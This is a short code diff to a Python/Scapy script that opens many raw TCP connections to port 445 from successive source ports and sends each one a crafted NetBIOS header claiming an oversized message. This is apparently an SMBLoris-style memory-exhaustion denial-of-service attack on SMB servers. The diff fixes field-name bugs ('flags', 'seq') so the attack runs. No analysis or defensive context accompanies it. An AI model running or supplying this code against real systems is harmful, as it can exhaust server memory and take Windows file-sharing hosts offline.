@@ -14,12 +14,12 @@ t.dport = 445
 for p in range(p0,p0+700):
    print p
    t.sport = p
-   t.flag = "S"
+   t.flags = "S"
 
    r = sr1(i/t)
    rt = r[TCP]
    t.ack = rt.seq + 1
-   t.sep = rt.ack
+   t.seq = rt.ack
    t.flags = "A"
    sbss = '\x00\x01\xff\xff'
    send(i/t/sbss)
